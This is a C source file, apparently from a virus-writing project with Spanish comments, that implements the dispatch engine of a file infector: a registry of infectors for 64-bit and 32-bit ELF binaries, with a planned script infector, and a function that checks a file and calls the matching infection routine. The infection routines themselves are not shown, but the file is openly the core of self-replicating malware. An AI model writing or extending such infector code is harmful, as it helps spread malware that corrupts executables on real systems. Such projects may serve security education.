#include "../../include/infector.h"
#include "../../include/war.h"
#include <stdio.h>

// Debug macro
#ifdef DEBUG
#define DEBUG_ENGINE(fmt, ...) fprintf(stderr, "[DEBUG-ENGINE] " fmt "\n", ##__VA_ARGS__)
#else
#define DEBUG_ENGINE(fmt, ...) ((void)0)
#endif

// BONUS 1: declaraciones para ELF32 (implementar después)
// extern bool is_elf32_file(const char *filepath);
// extern int infect_elf32(const char *filepath, t_config *cfg);

// BONUS 3: declaraciones para scripts (implementar después)
// extern bool is_script_file(const char *filepath);
// extern int infect_script(const char *filepath, t_config *cfg);

// Registro de infectores disponibles
t_infector g_infectors[] = {
    {
        .name = "ELF64",
        .can_infect = is_elf64_file,
        .infect = infect_elf64,
        .enabled = true
    },
    // BONUS 1: descomentar cuando esté listo
    {
        .name = "ELF32",
        .can_infect = is_elf32_file,
        .infect = infect_elf32,
        .enabled = true  // Activar con cfg->enable_32bit
    },
    // BONUS 3: descomentar cuando esté listo
    // {
    //     .name = "Script",
    //     .can_infect = is_script_file,
    //     .infect = infect_script,
    //     .enabled = false  // Activar con cfg->enable_scripts
    // },
};

const int g_num_infectors = sizeof(g_infectors) / sizeof(g_infectors[0]);

int infector_engine_run(const char *filepath, t_config *cfg) {
    if (!filepath || !cfg) {
        DEBUG_ENGINE("infector_engine_run: NULL filepath or cfg");
        return -1;
    }

    DEBUG_ENGINE("========== infector_engine_run START ==========");
    DEBUG_ENGINE("filepath: %s", filepath);
    DEBUG_ENGINE("Number of infectors: %d", g_num_infectors);

    // Iterar sobre todos los infectores registrados
    for (int i = 0; i < g_num_infectors; i++) {
        t_infector *inf = &g_infectors[i];

        DEBUG_ENGINE("Checking infector[%d]: name=%s, enabled=%d", i, inf->name, inf->enabled);

        // Saltar si está deshabilitado
        if (!inf->enabled) {
            DEBUG_ENGINE("  -> SKIP: disabled");
            continue;
        }
        
        // Verificar si este infector puede manejar el archivo
        bool can = inf->can_infect(filepath);
        DEBUG_ENGINE("  -> can_infect() = %d", can);
        
        if (can) {
            DEBUG_ENGINE("  -> CALLING %s.infect()", inf->name);
            int ret = inf->infect(filepath, cfg);
            DEBUG_ENGINE("  -> infect() returned %d", ret);
            DEBUG_ENGINE("========== infector_engine_run END (ret=%d) ==========", ret);
            return ret;
        }
    }
    
    DEBUG_ENGINE("No compatible infector found");
    DEBUG_ENGINE("========== infector_engine_run END (ret=-1) ==========");
    // Ningún infector compatible
    return -1;
}

const char *infector_get_type_name(const char *filepath) {
    for (int i = 0; i < g_num_infectors; i++) {
        if (g_infectors[i].can_infect(filepath)) {
            return g_infectors[i].name;
        }
    }
    return "Unknown";
}